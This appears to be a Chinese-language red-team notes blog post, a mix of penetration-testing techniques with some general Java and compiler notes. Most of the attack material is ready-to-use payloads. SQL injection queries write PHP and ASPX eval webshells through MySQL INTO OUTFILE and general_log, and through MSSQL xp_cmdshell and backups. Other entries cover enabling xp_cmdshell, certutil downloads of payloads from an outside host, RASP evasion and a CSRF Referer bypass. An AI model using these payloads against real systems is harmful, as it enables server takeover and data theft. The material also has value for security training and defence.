+<h2 id="xxe-csrf"><a href="#xxe-csrf" class="headerlink" title="xxe,csrf"></a>xxe,csrf</h2><p>1、首先xxe我们也可以先将我们的content-type改为我们的application/xml，不管他是application/data,application/json，都可以改成application/xml，然后看看response对比哈，如果有区别的话可以FUZZING一哈xxe的payload<br>2、关于csrf，其实csrf可以简单的理解借刀杀人，用当前目标的权限去做他能做的事情,如果此后台管理员能编辑模板插入脚本代码，那么我们就可以构造出POC去getshell，但是话又说回来，这2个洞我反正在项目中遇到是很少的。</p>
+<p>最近遇到csrf和反射xss有关的，实际呢是一个url的重定向。后面修复的方案就是将refer中包含了该ip的就放行，否则就是不通过refer的校验，所以有两种绕过形式：1、 malicousIP/HostIP/xx xx网页302重定向到 那个危害的url。但是这种方法只在ie浏览器中可行，firefox和chrome都会变成图二这样。host对的 但是refer不是同源的情况下 会指向原refer起到了保护的作用。 2、第二种情况通杀，毕竟只包含了这个ip就可以 ，那么可以构造一个域名 <a href="http://www.192.168.70.41.v1rus.top。浏览这个网址的时候再做302重定向就ok。" target="_blank" rel="noopener">www.192.168.70.41.v1rus.top。浏览这个网址的时候再做302重定向就ok。</a></p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20211027100642271.png" alt="image-20211027100642271"></p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20211027100734565.png" alt="image-20211027100734565"></p>
+<p>图二</p>
+<p>网页重定向的方法:<a href="https://www.jianshu.com/p/3985715c37b1" target="_blank" rel="noopener">https://www.jianshu.com/p/3985715c37b1</a> 涉及apache RewriteRule .htaccess模块的运用，html，js的控制等。</p>
+<h2 id="rasp的绕过"><a href="#rasp的绕过" class="headerlink" title="rasp的绕过"></a>rasp的绕过</h2><p>1、 jni方法加载dll自定义方法（java的rasp只可以修改java class的字节码，不可以修改native库的字节码。虽然这句话说起来很别扭，但是像我们阐述一个道理，即java agent修改字节码的能力是有限的。） 比如Tomcat的apr库提升性能调用jni方法，其中有个危险的create方法调用命令行。（一般都存在于$CATALINA_HOME/bin）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编写带有native声明的方法的java类，生成.java文件</span><br><span class="line">使用javac命令编译所编写的java类，生成.class文件</span><br><span class="line">使用javah -jni java类名生成扩展名为h的头文件，也即生成.h文件</span><br><span class="line">使用C&#x2F;C++（或者其他编程想语言）实现本地方法，创建.h文件的实现，也就是创建.cpp文件实现.h文件中的方法</span><br><span class="line">将C&#x2F;C++编写的文件生成动态连接库，生成dll文件</span><br></pre></td></tr></table></figure>
+
+<p>2、 new一个新的线程（发rasp会判断请求url是否为空来判断是否校验。我们将 return clean；注释掉，发现能够拦截，我们用线程的方式启动请求context中没有url。所以能绕过。）</p>
+<p>3、 把恶意代码放在异常类去执行</p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20210928163031314.png" alt="image-20210928163031314"></p>
+<p>4、 enablehook关掉</p>
+<p>tricks：</p>
+<p>1、 反弹Shell的时候不要用命令进行反弹，会触发EDR等安全设备告警，可采用Java API    </p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20210928163331008.png" alt="image-20210928163331008"></p>
+<p>l1nk3r的奇怪的base64编码</p>
+<p>sun.misc.BASE64Decoder这个方法做base64解码的时候，针对base64的兼容性更高，你在base64的字符串后面无论加多少个=都没关系，但是在例如java.util.base64.decode这类型严格按照base64规范的进行解码的方法下，就会出现报错。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20210928165006359.png" alt="image-20210928165006359"></p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20210928170052893.png" alt="image-20210928170052893"></p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/75&e=1638287999&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zDjbvN6WJZhacPZVSgw2lcXTpbf4s=.jpeg" alt="img"></p>
+<p>备案收集、通过网站ico收集、小程序子域名/接口收集、组织架构股东书收集、网盘/云雀收集,dns历史解析、github搜索、JsFind、webpack、内部/内测群/群文件</p>
+<p>1、备案收集：</p>
+<p>同备案查询，<a href="https://icp.chinaz.com/" target="_blank" rel="noopener">https://icp.chinaz.com/</a> oneforall也提供了接口，但是备案查询</p>
+<p>2、网站ico收集 语法：http.favicon.hash:-1507567067 在python中脚本设置，网站的ico在hmtl页面中的head部分 有个link rel=”icon” href后面的就是路径。</p>
+<p>3、ssl证书 这个oneforall里面运用接口查询是有的  就是想清楚的了解一下是周末一回事儿 <a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></p>
+<h5 id="子域名https-saucer-man-com-information-security-224-html"><a href="#子域名https-saucer-man-com-information-security-224-html" class="headerlink" title="子域名https://saucer-man.com/information_security/224.html"></a>子域名<a href="https://saucer-man.com/information_security/224.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/224.html</a></h5><p>主要分为三种，爆破，ssl证书，dns记录查询</p>
+<h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h2><p>这个命令最初是用来管理证书的，但对红队的工作有很大的帮助，原因有很多:</p>
+<ul>
+<li>它是由Microsoft默认安装的二进制文件。</li>
+<li>它允许建立<strong>HTTP/s</strong>连接并且是<strong>proxy-aware(使用系统中配置的代理)</strong>。</li>
+<li>它允许在Base64或十六进制中编码/解码。</li>
+</ul>
+<p>在我们的场景中，我们运用它向我们控制的web服务器发出HTTP/s请求，确认我们的命令是否被执行。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;;EXEC xp_cmdshell &#39;certutil.exe -urlcache -f http:&#x2F;&#x2F;example.com&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="词法分析-语法分析-语义分析"><a href="#词法分析-语法分析-语义分析" class="headerlink" title="词法分析 语法分析 语义分析"></a>词法分析 语法分析 语义分析</h2><p>词语分析 文本扫描器工作的源代码作为字符流进行扫描，并将其转换为有意义的词素。词汇分析器以标记的形式表示这些词汇：</p>
+<p>&lt;token-name, attribute-value&gt;【词法分析是编译器的第一个阶段。它从以句子形式编写的语言预处理器中获取经过修改的源代码。词法分析器通过<strong>删除源代码中的任何空格或注释</strong>，将这些语法分解为一系列标记。  】</p>
+<p>语法分析 是指抽象成AST。（抽象语法树（Abstract Syntax Tree，AST））你int a =”string”在语法结构中是对的。根据ast树可以构造成，keyvalueExpression根节点，然后是key和value在左右两侧。</p>
+<p>语义分析 是指分析语义，上面的例子违反了规范，左右两侧的数据类型不一致。类似的还有返回值类型不一致。</p>
+<h2 id="生成一个对象"><a href="#生成一个对象" class="headerlink" title="生成一个对象"></a>生成一个对象</h2><p>先了解Java 中创建对象的方法大概有下面这七种：</p>
+<ul>
+<li>使用 new 关键字</li>
+<li>Class 类的 newInstance() 方法</li>
+<li>Constructor 类的 newInstance() 方法</li>
+<li>Object 对象的 clone 方法</li>
+<li>反序列化创建对象</li>
+<li>使用 Unsafe 类创建对象</li>
+<li>通过工厂方法返回对象，如：String str = String.valueOf(23); </li>
+</ul>
+<h2 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h2><p>jsonp、mysql local infile（开启之后我们就可以通过如下命令进行文件读取并且写入到表中，我们以C:\1.txt为例，将其中内容写入到test表中，并且以\n为分隔符。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data local infile &#96;&#96;&#39;C:&#x2F;1.txt&#39;&#96; &#96;into table test fields terminated by &#96;&#96;&#39;\n&#39;&#96;&#96;;</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就可以读取客户端本地的文件，并写入到表中）、rdp </p>
+<p>漏洞（，MITM记录了以下操作事件：</p>
+<ul>
+<li>点阵图像</li>
+<li>鼠标移动</li>
+<li>键盘输入</li>
+<li>连接信息（本地IP地址、用户名、密码、域名、计算机名）</li>
+<li>剪贴板内容</li>
+</ul>
+<p>）、执行文件（activex、pe文件）</p>
+<h2 id="数据库写shell"><a href="#数据库写shell" class="headerlink" title="数据库写shell"></a>数据库写shell</h2><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p>利用条件：利用条件</p>
+<ol>
+<li>数据库当前用户<strong>为root权限</strong>或者至少有<strong>FILE权限</strong></li>
+<li>知道当前网站的<strong>绝对路径</strong></li>
+<li>PHP的GPC为 off状态 <strong>无特殊字符转义</strong></li>
+<li>写入的那个路径存在<strong>写入权限</strong></li>
+<li>.secure_file_priv 的值非NULL或包含了导出的绝对路径（show global variables like ‘%secure%’;或者设置为空，那么对所有路径均可进行导入导出。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1、 http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1 +UNION+ALL+SELECT+1,2,’&lt;? phpinfo(); ?&gt;’ into outfile ‘G:&#x2F;2.txt’ %23</span><br><span class="line"></span><br><span class="line">2、 http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1 +UNION+ALL+SELECT+1,2,’&lt;?php phpinfo() ?&gt;’ into dumpfile ‘G:&#x2F;2.txt’ %23</span><br><span class="line"></span><br><span class="line">3、 非联合查询 http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1 into outfile ‘G:&#x2F;2.txt’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23</span><br><span class="line"></span><br><span class="line">4、 基于log写shell （查询日志路径之后更改并改回去）</span><br><span class="line">基于log日志写shell法</span><br><span class="line"></span><br><span class="line">show variables like ‘%general%’;</span><br><span class="line">查询当前mysql下log日志的默认地址，同时也看下log日志是否为开启状态，并且记录下原地址，方便后面恢复。</span><br><span class="line"></span><br><span class="line">set global general_log &#x3D; on;</span><br><span class="line">开启日志监测，一般是关闭的，如果一直开，文件会很大的。</span><br><span class="line"></span><br><span class="line">set global general_log_file &#x3D; ‘G:&#x2F;2.txt’;</span><br><span class="line">这里设置我们需要写入的路径就可以了。</span><br><span class="line"></span><br><span class="line">select ‘&lt;?php eval($_POST[‘shiyan’]);?&gt;’;</span><br><span class="line">查询一个一句话，这个时候log日志里就会记录这个。</span><br><span class="line"></span><br><span class="line">set global general_log_file &#x3D; ‘D:\xampp\mysql\data\LAPTOP-SO1V6ABB.log’;</span><br><span class="line">结束后，再修改为原来的路径。</span><br><span class="line"></span><br><span class="line">set global general_log &#x3D; off;</span><br><span class="line">关闭下日志记录。</span><br><span class="line"></span><br><span class="line">5、 0x05</span><br><span class="line"></span><br><span class="line">一个很老的创建再导出的方法，我也搞不懂为什么要有这样存在，可能是存在即合理把，肯定有它的用处。</span><br><span class="line"></span><br><span class="line">use test;</span><br><span class="line">连接 test 数据库。</span><br><span class="line"></span><br><span class="line">drop table if exists sy;</span><br><span class="line">搜索并删除存在的 sy 这个表。</span><br><span class="line"></span><br><span class="line">create table sy(eel text not null);</span><br><span class="line">建立这个sy表,然后里面一个eel的字段。</span><br><span class="line"></span><br><span class="line">insert into sy(eel) values (‘&lt;?php phpinfo(); ?&gt;’);</span><br><span class="line">写进入一句话</span><br><span class="line"></span><br><span class="line">SELECT eel FROM sy INTO OUTFILE ‘G:&#x2F;2.txt’;</span><br><span class="line">把这句话再导出来。</span><br><span class="line"></span><br><span class="line">DROP TABLE sy;</span><br><span class="line">删除这个表。</span><br></pre></td></tr></table></figure>
+
+<p>into oufile（hex编码）, into dumpfile（只能导出一行）,写log，写表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from student into outfile &quot;C:&#x2F;phpStudy&#x2F;MySQL&#x2F;bin&#x2F;test.php&quot; LINES STARTING BY &#39;&lt;?php @eval($_POST[pass]);?&gt;&#39;;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/1595329544.jpg!small" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FIELDS TERMINATED BY &#39;,&#39;    &#x3D; 字段值之间以,分割</span><br><span class="line">OPTIONALLY ENCLOSED BY &#39;&quot;&#39;    &#x3D; 字段值以&quot;包裹</span><br><span class="line">LINES TERMINATED BY &#39;\n&#39;    &#x3D; 设置每⾏数据结尾的字符为换行符</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>可以利用的日志：只有查询日志和慢查询日志可利用（-1’;select “<?php eval($_POST[log]);?>“ from users where sleep(11);#）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">log_error</span><br></pre></td></tr></table></figure>
+
+<p>只读，只能通过修改mysql配置文件改路径，不能利用<br>事务日志、二进制日志和错误日志一样，只能通过修改mysql配置文件改路径，不能利用</p>
+<h3 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h3><p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N5eTAyMDE=,size_16,color_FFFFFF,t_70.png" alt="基本思路"></p>
+<p><a href="https://y4er.com/post/mssql-getshell/" target="_blank" rel="noopener">https://y4er.com/post/mssql-getshell/</a></p>
+<p><a href="https://www.cnblogs.com/0nc3/p/12071345.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nc3/p/12071345.html</a></p>
+<p>拿shell的两大前提就是</p>
+<ol>
+<li>有相应的权限db_owner</li>
+<li>知道web目录的绝对路径</li>
+</ol>
+<p>绝对路径：</p>
+<ol>
+<li>报错信息</li>
+<li>字典猜</li>
+<li>旁站的目录</li>
+<li>存储过程来搜索</li>
+<li>读配置文件</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;EXEC sp_configure &#39;show advanced options&#39;,1;&#x2F;&#x2F;允许修改高级参数</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;,1;  &#x2F;&#x2F;打开xp_cmdshell扩展</span><br><span class="line">RECONFIGURE;--</span><br><span class="line">当然还不行可能xplog70.dll需要恢复，看具体情况来解决吧</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1、-xp-cmdshell拿shell"><a href="#1、-xp-cmdshell拿shell" class="headerlink" title="1、 xp_cmdshell拿shell"></a>1、 xp_cmdshell拿shell</h3><p>xp_cmdshell这个存储过程可以用来执行cmd命令，那么我们可以通过cmd的echo命令来写入shell，当然前提是你知道web目录的绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.130.137&#x2F;1.aspx?id&#x3D;1;exec master..xp_cmdshell &#39;echo ^&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\404.aspx&#39; ;</span><br></pre></td></tr></table></figure>
+
+<p>由于cmd写webshell的主意这些转义的问题 推荐使用certutil或者vbs什么的来下载</p>
+<h3 id="2、-差异备份拿shell"><a href="#2、-差异备份拿shell" class="headerlink" title="2、 差异备份拿shell"></a>2、 差异备份拿shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. backup database 库名 to disk &#x3D; &#39;c:\bak.bak&#39;;--</span><br><span class="line"></span><br><span class="line">2. create table [dbo].[test] ([cmd] [image]);</span><br><span class="line"></span><br><span class="line">3. insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)</span><br><span class="line"></span><br><span class="line">4. backup database 库名 to disk&#x3D;&#39;C:\d.asp&#39; WITH DIFFERENTIAL,FORMAT;--</span><br></pre></td></tr></table></figure>
+
+<p>因为权限的问题，最好不要备份到盘符根目录</p>
+<p>当过滤了特殊的字符比如单引号，或者 路径符号 都可以使用定义局部变量来执行。</p>
+<h3 id="3、-log备份拿shell"><a href="#3、-log备份拿shell" class="headerlink" title="3、 log备份拿shell"></a>3、 log备份拿shell</h3><p>LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. alter database 库名 set RECOVERY FULL </span><br><span class="line"></span><br><span class="line">2. create table cmd (a image) </span><br><span class="line"></span><br><span class="line">3. backup log 库名 to disk &#x3D; &#39;c:\xxx&#39; with init </span><br><span class="line"></span><br><span class="line">4. insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) </span><br><span class="line"></span><br><span class="line">5. backup log 库名 to disk &#x3D; &#39;c:\xxx\2.asp&#39;</span><br></pre></td></tr></table></figure>
+
+<p>log备份的好处就是备份出来的webshell的文件大小非常的小</p>
+<h3 id="注意转义的点"><a href="#注意转义的点" class="headerlink" title="注意转义的点"></a>注意转义的点</h3><p>1.Windows：</p>
+<p>echo ^&lt;? php @eval($_POST[‘x’]); ?^&gt; &gt;shell.php<br>知识点：（1）^以转义字符的身份出现。因为在cmd环境中，有些字符具备特殊功能，如&gt;、&gt;&gt;表示重定向，|表示管道，&amp;、&amp;&amp;、||表示语句连接……它们都有特定的功度能，如果需要把它们作为字符输出知的话，echo &gt;、echo | ……之类的写法就会出错——cmd解释器会把它们作为具有特殊功能的字符对待，而不会作为普通字符处理，这个时候，就需道要对这些特殊字符做转义处理：在每个特殊字符回前加上转义字符^答，因此，要输出这些特殊字符，就需要用 echo ^&gt;、echo ^|、echo ^|^|、echo ^^……之类的格式来处理。此处转义&lt;和&gt;</p>
+<pre><code>（2） 此处^为什么不换成引号？因为windows写入时会把引号写进去</code></pre><p>2.Linux:</p>
+<p>echo ‘<? php @eval($_POST["x"]); ?>‘ &gt;shell.php</p>
+<h3 id="无法写shell"><a href="#无法写shell" class="headerlink" title="无法写shell"></a>无法写shell</h3><p>当遇到无法写shell，或者是站库分离的时候，直接通过xp_cmdshell来下载我们的payload来上线会更加方便。下载文件通常有下面几种姿势</p>
+<ol>
+<li>certutil</li>
+<li>vbs</li>
+<li>bitsadmin</li>
+<li>powershell</li>
+<li>ftp</li>
+</ol>
+<p>mssql众多的储存过程是我们利用的关键</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xp_create_subdir建立个畸形目录解析。</span><br><span class="line">xp_regwrite 修改注册表 来劫持粘贴键 2008默认net权限</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="certutil-base64-解码写入"><a href="#certutil-base64-解码写入" class="headerlink" title="certutil base64 解码写入"></a>certutil base64 解码写入</h3><p>上面提到 <code>echo</code> 写入万恶的转义问题，那么，通过 base64 编码是不是可以解决这烦人的转义问题呢？是的！<br>比如，我们要把 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>（base64 编码为：<code>PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code>）写入文件，可用如下方法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&#x3D;&#x3D; &gt; 1.txt</span><br><span class="line">certutil.exe -decode 1.txt 2.jsp</span><br></pre></td></tr></table></figure>
+
+<h3 id="certutil-下载文件的方法："><a href="#certutil-下载文件的方法：" class="headerlink" title="certutil 下载文件的方法："></a><code>certutil</code> 下载文件的方法：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f &lt;url&gt;</span><br><span class="line">示例：</span><br><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.245.130:8080&#x2F;1.txt</span><br><span class="line">或者：</span><br><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.245.130:8080&#x2F;1.txt 2.txt</span><br></pre></td></tr></table></figure>
+
+<p>不幸的是，<strong>即使下载的不是有毒文件，杀软还是很可能会杀掉：</strong></p>
+<h2 id="shiro下tomcat加载不了cc4"><a href="#shiro下tomcat加载不了cc4" class="headerlink" title="shiro下tomcat加载不了cc4"></a>shiro下tomcat加载不了cc4</h2><p>网上现在是说：<code>Tomcat</code>和<code>JDK</code>的<code>Classpath</code>是不公用且不同的，<code>Tomcat</code>启动时，不会用<code>JDK</code>的<code>Classpath</code>，需要在<code>catalina.sh</code>中进行单独设置。</p>
+<p>其实这个根本原因是tomcat破坏了了双亲委派机制，并且在urlclassLoader加载的时候限制了ucp(urlclasspath)，导致没有pom仓库的路径。</p>
+<p>这里要关注的点是： ucp.getResource</p>
+<p>所有继承至URLClassLoader的子类（不overwrite findClass的情况下），都是 【只能通过ucp来进行资源的加载】。</p>
+<p>URLClassPath做到了两点：</p>
+<ul>
+<li>指定资源的来源：可以来自于Local，来自于Remote；可以是Jar，也可以是War等等（指定URL即可）。</li>
+<li>限制资源的来源：当指定了该ucp，那么该ClassLoader的资源来源也就被【限制】只能是来自于这里。</li>
+</ul>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20211008155409591.png" alt="image-20211008155409591"></p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20211008173525838.png" alt="image-20211008173525838">答案在这里。使用tomcat的类查询机制。 详见tomcat 的委派机值 ，Thread.getCurrentThread.getClassLoader。这个方法  按照道理webClassLoader是可以加载在Web-inf下的class的 但是这个类会解析成entry 而不是像urlclassloader的classpath 所以对</p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/20200624164228-a27cf462-b5f6-1.png" alt="img"></p>
+<p>这个fqcn的名字无法返回，他会解析成[Lorg/apache…这样，导致前面无法生成类，去后面的根的Urlclassloader加载，导致找不到路径。</p>
+<h2 id="如何识别WAF"><a href="#如何识别WAF" class="headerlink" title="如何识别WAF#"></a>如何识别WAF<a href="https://www.secquan.org/Discuss/1070396#0X01-如何识别WAF" target="_blank" rel="noopener">#</a></h2><h3 id="识别waf技术"><a href="#识别waf技术" class="headerlink" title="识别waf技术"></a>识别waf技术</h3><ul>
+<li>一些WAF在请求中设置自己的cookie（例如Citrix,Netscaler,Yunsuo WAF,safedog）</li>
+<li>有些人将自己与单独的<strong>标头关联</strong>（例如Anquanbao WAF,AmazonAWSWAF）。</li>
+<li>有些经常更改标头和混乱的字符以使攻击者感到困惑（例如Netscaler,Big-IP）。</li>
+<li>有些人在<strong>服务器头</strong>数据包中暴露自己（eg. Approach, WTS WAF）</li>
+<li>一些WAF在响应内容<strong>body</strong>中公开自身（例如DotDefender,Armor,Sitelock）</li>
+<li>其他WAF会对恶意请求做出<strong>不寻常的响应代码</strong>答复（例如WebKnight,360WAF</li>
+<li>有些WAF会返回一堆垃圾数据，卡死你(例如:百度云加速乐)</li>
+</ul>
+<h3 id="检测技术"><a href="#检测技术" class="headerlink" title="检测技术"></a>检测技术</h3><ol>
+<li>从浏览器发出<strong>普通的GET请求</strong>，拦截并记录响应头（特别是cookie）。</li>
+<li>从命令行（例如<strong>curl</strong>）发出请求，并测试响应内容和标头（不包括user-agent）。</li>
+<li>向<strong>随机开放的端口</strong>发出GET请求，并抓住可能暴露WAF身份的标语。</li>
+<li>如果某处有登录页面，表单页面等.请尝试一些常见的（易于检测的）有效负载，例如 “ or 1=1 – -</li>
+<li>将../../../etc/passwd附加到URL末尾的随机参数</li>
+<li>在url的末尾添加一些吸引人的关键字，如’or sleep（5）‘ (<strong>危险测试</strong>)</li>
+<li>使用<strong>过时的协议</strong>（如http/0.9）发出get请求（http/0.9不支持post类型查询）。</li>
+<li>很多时候，waf根据不同的交互类型改变服务器头。</li>
+<li>删除操作技术-发送一个原始的fin/rst包到服务器并识别响应。</li>
+<li>侧通道攻击-检查请求和响应内容的<strong>计时行为</strong>。</li>
+</ol>
+<p>wafw00f ，identywaf ，waf识别工具</p>
+<h3 id="rmi中-client-server-register的关系"><a href="#rmi中-client-server-register的关系" class="headerlink" title="rmi中 client server register的关系"></a>rmi中 client server register的关系</h3><p><a href="https://www.anquanke.com/post/id/197829" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197829</a></p>
+<h3 id="Naming-bind"><a href="#Naming-bind" class="headerlink" title="Naming.bind:"></a>Naming.bind:</h3><p>我们一般都是在client端发起lookup请求的操作，但是在8u141之前 ，服务器server端和客户client端，都是可以进行Naming.bind的操作。但是如果要使用bind/rebind请求来远程攻击Registry，JDK版本必须在8u141之前。因为，sun/rmi/registry/RegistryImpl_Skel.java#dispatch这里会先去判断是否为本地绑定请求，然后再进行反序列化。</p>
+<h3 id="Naming-lookup"><a href="#Naming-lookup" class="headerlink" title="Naming.lookup:"></a>Naming.lookup:</h3><p>就像前面说的，我们一般是发起lookup请求的操作，服务器端在RegisteryImpl_Stub的dispatch对请求来的参数做分发的时候，发现是lookup的方法case2。</p>
+<h3 id="为什么lookup之后，registry会反连我们的jrmpServer？-详情"><a href="#为什么lookup之后，registry会反连我们的jrmpServer？-详情" class="headerlink" title="为什么lookup之后，registry会反连我们的jrmpServer？#详情"></a>为什么lookup之后，registry会反连我们的jrmpServer？<a href="https://www.anquanke.com/post/id/197829#h3-8" target="_blank" rel="noopener">#详情</a></h3><p>RemoteObjectInvocationHandler就是第一种方法，我们将AnnotationInvocationHandler替换成RemoteObjectInvocationHandler。在反序列化时会调用RemoteObjectInvocationHandler的父类RemoteObject的readObject函数，再调用其中的readExternal函数。</p>
+<p><img src="/2021/11/01/%E5%8D%81%E6%9C%88%E6%95%B4%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/1/image-20211015171238793.png" alt="image-20211015171238793"></p>
+<p><a href="http://www.mamicode.com/info-detail-2252602.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-2252602.html</a></p>
 ]]></content>
   </entry>
 </search>
